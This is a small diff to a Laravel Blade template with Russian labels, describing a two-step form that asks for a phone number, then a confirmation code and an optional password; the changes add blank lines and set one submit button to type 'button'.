@@ -6,16 +6,19 @@
         <!-- Первая форма -->
         <form id="form1" action="{{ secure_url('register_number') }}" method="POST">
             @csrf
+
             <div class="mb-3">
                 <p class="text-white">Введите номер телефона</p>
                 <input placeholder="895..." class="form-input" name="phone" autofocus>
             </div>
+
             <button type="button" class="w-100 btn btn-primary form-button" onclick="showSecondForm()">Отправить</button>
         </form>
 
         <!-- Вторая форма (скрытая) -->
         <form id="form2" action="{{ secure_url('next_step_number') }}" method="POST" style="display: none;">
             @csrf
+
             <div class="mb-3">
                 <p class="text-white">Введите код подтверждения</p>
                 <input placeholder="Код подтверждения" class="form-input" name="code" autofocus>
@@ -26,7 +29,7 @@
                 <input placeholder="Если есть" class="form-input" name="password" autofocus>
             </div>
 
-            <button class="w-100 btn btn-primary form-button">Отправить данные</button>
+            <button type="button" class="w-100 btn btn-primary form-button">Отправить данные</button>
         </form>
     </div>
 </div>
